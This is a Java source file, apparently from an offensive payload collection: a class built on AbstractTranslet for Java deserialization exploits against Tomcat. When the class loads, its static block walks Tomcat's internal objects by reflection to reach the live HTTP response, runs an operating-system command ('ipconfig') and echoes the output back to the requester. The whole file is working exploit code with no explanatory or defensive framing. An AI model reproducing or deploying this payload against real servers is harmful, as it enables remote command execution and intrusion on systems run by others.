package com.Jasetol.payloads;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.AbstractProtocol;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class echoForTomcat02 extends AbstractTranslet {
    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            Field context01 = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context");
            context01.setAccessible(true);
            ApplicationContext applicationContext = (ApplicationContext) context01.get(standardContext);
            Field service = Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service");
            service.setAccessible(true);
            StandardService standardService = (StandardService) service.get(applicationContext);
            Field field01 = Class.forName("org.apache.catalina.core.StandardService").getDeclaredField("connectors");
            field01.setAccessible(true);
            Connector[] connectors = (Connector[]) field01.get(standardService);
            Field field02 = Class.forName("org.apache.catalina.connector.Connector").getDeclaredField("protocolHandler");
            field02.setAccessible(true);
            ProtocolHandler protocolHandler = (ProtocolHandler) field02.get(connectors[0]);
            Field handler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredField("handler");
            handler.setAccessible(true);
            Class[] classes = AbstractProtocol.class.getDeclaredClasses();
            for (int i = 0 ; i < classes.length ; i++){
                if (classes[i].getName().length() == 52){
                    Field global = classes[i].getDeclaredField("global");
                    global.setAccessible(true);
                    RequestGroupInfo requestGroupInfo = (RequestGroupInfo) global.get(handler.get(protocolHandler));
                    Field processors = Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors");
                    processors.setAccessible(true);
                    List<RequestInfo> list = (List<RequestInfo>) processors.get(requestGroupInfo);
                    for (RequestInfo requestInfo : list) {
                        Field req1 = Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req");
                        req1.setAccessible(true);
                        org.apache.coyote.Request request = (org.apache.coyote.Request) req1.get(requestInfo);
                        org.apache.catalina.connector.Request request1 = (org.apache.catalina.connector.Request) request.getNote(1);
                        Response response = request1.getResponse();
                        Process process = Runtime.getRuntime().exec("ipconfig");
                        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        StringBuffer stringBuffer = new StringBuffer();
                        String lineData;
                        while ((lineData = bufferedReader.readLine()) != null){
                            stringBuffer.append(lineData + '\n');
                        }

                        response.getOutputStream().write(stringBuffer.toString().getBytes(StandardCharsets.UTF_8));
                        response.getOutputStream().flush();
                        response.getOutputStream().close();
                    }
                }
            }
        }catch (Exception e){}
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
